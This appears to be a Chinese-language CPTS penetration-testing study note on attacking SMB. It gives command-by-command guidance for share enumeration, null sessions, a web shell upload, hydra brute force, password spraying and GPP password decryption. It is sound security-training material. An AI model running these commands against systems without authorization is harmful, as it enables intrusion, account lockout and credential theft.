# 第 45 章 - SMB

## 標籤

- #cpts
- #chapter
- #smb
- #windows
- #services

## 學習目標

- 理解 SMB 在 Windows 企業環境中的高價值攻擊面。
- 能用 nmap、smbclient、smbmap、enum4linux 列舉共享與主機資訊。
- 能區分匿名 vs 認證 vs null session 列舉的差異。
- 能從共享內容推進到憑證、腳本或橫向移動線索。

---

## 理論基礎

```text
SMB（Server Message Block）：
  Windows 主要的檔案/印表機共享與 RPC 通訊協定
  Port: 445/tcp（直接 SMB）、139/tcp（NetBIOS over TCP）

三種存取方式：
  匿名（Guest）  → 無需憑證，受 ACL 限制
  Null Session   → 空使用者名稱空密碼，老舊 Windows 可列舉用戶
  有效憑證       → 可存取對應權限的分享

高價值目標：
  SYSVOL / NETLOGON → AD 群組原則、登入腳本（常含密碼）
  C$ / ADMIN$ / IPC$ → 管理員分享（需高權限）
  自訂分享 IT/Deploy/Backup → 最常藏憑證/設定/備份
```

---

## 方法一：服務發現與版本識別

```bash
# 掃描 SMB 埠
nmap -sV -p 139,445 TARGET_IP
# -p 139,445 → NetBIOS 與直接 SMB 兩個埠都掃

# NSE 腳本：OS 偵測 + 分享列舉 + 使用者枚舉
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users \
  -p 445 TARGET_IP
# smb-os-discovery → 從 SMB 協定取得 OS 版本、主機名、網域
# smb-enum-shares  → 列出可見的分享（匿名或憑證）
# smb-enum-users   → 嘗試列出本機使用者（需特定設定允許）

# 檢查 SMBv1 是否啟用（EternalBlue 相關）
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
# ms17-010 → EternalBlue（WannaCry 利用的漏洞）
```

---

## 方法二：匿名 / Null Session 列舉

```bash
# smbclient 匿名列出分享
smbclient -L //TARGET_IP -N
# -L → 列出分享（List）
# -N → 不提示密碼（No password，匿名）

# enum4linux 全面枚舉（Linux 工具）
enum4linux -a TARGET_IP
# -a → 全部列舉（all）：使用者、分享、OS、群組、密碼原則

# enum4linux-ng（現代版，支援更多輸出格式）
enum4linux-ng TARGET_IP -A
# -A → 全部資訊

# smbmap 顯示分享與權限
smbmap -H TARGET_IP
# -H → 目標主機
# 輸出：分享名稱、讀/寫權限、備註
smbmap -H TARGET_IP -u '' -p ''
# 明確指定空帳號密碼（Null Session）
```

---

## 方法三：認證後列舉與存取

```bash
# 有效憑證列出分享
smbclient -L //TARGET_IP -U username
# 輸入密碼後列出所有可見分享

# 連線特定分享
smbclient //TARGET_IP/SHARE_NAME -U username
# 進入互動式 SMB shell
smb: \> ls          # 列目錄
smb: \> get file.txt /tmp/  # 下載
smb: \> put shell.aspx      # 上傳（若有寫入權限）
smb: \> recurse ON; mget *  # 遞迴下載所有檔案

# smbmap 帶憑證遞迴列出
smbmap -H TARGET_IP -u username -p password -R SHARE_NAME
# -R → 遞迴列出（Recursive）

# CrackMapExec（CME）批次列舉
crackmapexec smb TARGET_IP -u username -p password --shares
# --shares → 列出所有分享與權限

crackmapexec smb TARGET_IP -u username -p password -M spider_plus
# spider_plus → 遞迴爬取所有分享並輸出檔案清單到 JSON
```

---

## 方法四：暴力破解

```bash
# hydra SMB 暴力破解
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  smb://TARGET_IP
# 注意：SMB 連續失敗可能觸發帳號鎖定，先確認鎖定原則

# CME 密碼噴灑（Password Spray，同一密碼試所有使用者）
crackmapexec smb TARGET_IP -u users.txt -p 'Password123' --continue-on-success
# --continue-on-success → 找到有效憑證後繼續（不停在第一個）
# 注意：噴灑間隔要夠長，避免觸發鎖定
```

---

## 方法五：尋找高價值內容

```bash
# 連線 SYSVOL（網域環境）
smbclient //TARGET_IP/SYSVOL -U "DOMAIN\username"
# SYSVOL 常含 Group Policy Preference（GPP）密碼（已加密但可解）

# grep GPP 密碼（cpassword 欄位）
find /tmp/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
# 解密 GPP 密碼（已知固定 AES key）
gpp-decrypt ENCRYPTED_CPASSWORD_STRING

# 在分享中搜尋敏感關鍵字
smbmap -H TARGET_IP -u user -p pass -R --exclude ADMIN$ IPC$ \
  | grep -iE "password|secret|backup|config|key"

# 下載找到的所有設定檔
smbclient //TARGET_IP/SHARE -U user -c "recurse ON; mget *.config"
smbclient //TARGET_IP/SHARE -U user -c "recurse ON; mget *.xml"
```

---

## 決策流程

```
nmap -p 445 確認 SMB 服務 + 版本
    ↓
smbclient -L -N → 匿名可見哪些分享？
    ↓
smbmap -H → 各分享讀/寫權限？
    ↓
有憑證？
  → 是：CME --shares → spider_plus 遞迴爬取
  → 否：enum4linux -a → 找使用者列表 → hydra 噴灑
    ↓
分享內容分析：
  SYSVOL → GPP 密碼 → gpp-decrypt
  Backup → 設定/憑證
  Deploy → 安裝包/腳本
  IT     → SSH key / config
```

---

## 速查表

```bash
# 服務識別
nmap -sV --script smb-os-discovery,smb-enum-shares -p 445 TARGET_IP

# 匿名列舉
smbclient -L //TARGET_IP -N
enum4linux -a TARGET_IP
smbmap -H TARGET_IP

# 認證列舉
crackmapexec smb TARGET_IP -u user -p pass --shares
smbmap -H TARGET_IP -u user -p pass -R SHARE

# 連線分享
smbclient //TARGET_IP/SHARE -U user

# GPP 密碼解密
gpp-decrypt CPASSWORD_HASH
```

---

## 關聯筆記

- [[22-Nmap指令碼引擎NSE|第 22 章 - Nmap 指令碼引擎（NSE）]]
- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
